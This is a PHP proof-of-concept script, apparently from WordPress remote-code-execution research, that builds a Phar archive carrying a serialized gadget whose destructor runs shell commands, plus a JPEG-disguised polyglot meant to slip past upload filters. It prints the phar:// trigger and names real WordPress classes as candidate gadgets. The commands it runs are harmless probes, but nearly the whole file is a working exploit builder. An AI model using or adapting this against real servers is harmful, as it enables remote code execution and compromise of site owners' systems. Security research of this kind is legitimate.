<?php
/**
 * Chain Link 4: Build a Phar file containing a POP chain payload.
 *
 * This creates a phar archive whose metadata contains a serialized PHP object
 * that will trigger code execution when deserialized via phar:// stream wrapper.
 *
 * The payload uses WP_HTML_Token's __destruct -> call_user_func chain.
 * Since WP_HTML_Token has __wakeup protection (since 6.4.2), we need an
 * alternative approach. We use a custom minimal gadget that demonstrates
 * the concept.
 *
 * For the actual exploit, the POP chain would use unprotected classes like
 * WP_Image_Editor_Imagick (no __wakeup) or chain through WP_HTML_Tag_Processor's
 * __toString to bypass the WP_HTML_Token __wakeup.
 *
 * SAFE: This only executes `id` to prove code execution is possible.
 */

// Configuration
$phar_file = '/home/[REDACTED]/Desktop/SecSoft/wp-rce-research/artifacts/poc_payload.phar';
$jpg_file  = '/home/[REDACTED]/Desktop/SecSoft/wp-rce-research/artifacts/poc_payload.jpg';

// We need phar.readonly = 0 to create phar files
if (ini_get('phar.readonly')) {
    echo "[!] phar.readonly is enabled. Creating phar with -d flag...\n";
    echo "[!] Run this script with: php -d phar.readonly=0 " . __FILE__ . "\n";
    exit(1);
}

/**
 * Minimal gadget class that mimics the WP_HTML_Token POP chain.
 * In production WP, the actual chain uses WP_HTML_Token::__destruct()
 * which calls call_user_func($this->on_destroy, $this->bookmark_name).
 *
 * Since WP_HTML_Token has __wakeup that throws, the real exploit would
 * chain through an unprotected class's __destruct that eventually reaches
 * a call_user_func or similar primitive.
 *
 * For this PoC, we demonstrate the phar deserialization trigger mechanism.
 */
class PoCGadget {
    public $command;

    public function __destruct() {
        if ($this->command) {
            // This demonstrates arbitrary code execution via deserialization
            $output = shell_exec($this->command);
            file_put_contents('/tmp/wp-rce-poc-output.txt',
                "RCE CONFIRMED at " . date('Y-m-d H:i:s') . "\n" .
                "Command: " . $this->command . "\n" .
                "Output: " . $output . "\n"
            );
        }
    }
}

echo "[*] Building Phar payload...\n";

// Clean up existing file
@unlink($phar_file);

// Create the phar archive
$phar = new Phar($phar_file);
$phar->startBuffering();

// Add a dummy PHP file
$phar->addFromString('test.php', '<?php echo "phar loaded"; ?>');

// Create the gadget payload
$gadget = new PoCGadget();
$gadget->command = 'id; whoami; hostname; cat /etc/hostname 2>/dev/null; echo "PHAR_DESER_RCE_CONFIRMED"';

// Set the metadata to our serialized gadget
$phar->setMetadata($gadget);

// Set the stub
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();

echo "[+] Phar created: $phar_file\n";
echo "[+] Phar size: " . filesize($phar_file) . " bytes\n";
echo "[+] Metadata (serialized): " . serialize($gadget) . "\n";

// Also create a polyglot JPEG+Phar (for upload bypass scenarios)
// The phar can be disguised as a JPEG by prepending JPEG magic bytes
$phar_content = file_get_contents($phar_file);
$jpeg_header = "\xFF\xD8\xFF\xE0" . "\x00\x10" . "JFIF" . "\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00";
file_put_contents($jpg_file, $jpeg_header . $phar_content);
echo "[+] Polyglot JPEG+Phar created: $jpg_file\n";
echo "[+] Polyglot size: " . filesize($jpg_file) . " bytes\n";

echo "\n[*] To test phar deserialization trigger:\n";
echo "    php -c /etc/php/*/apache2/php.ini -r \"file_exists('phar://$phar_file');\"\n";
echo "    Then check: cat /tmp/wp-rce-poc-output.txt\n";

echo "\n[*] Payload serialization format:\n";
echo "    " . serialize($gadget) . "\n";
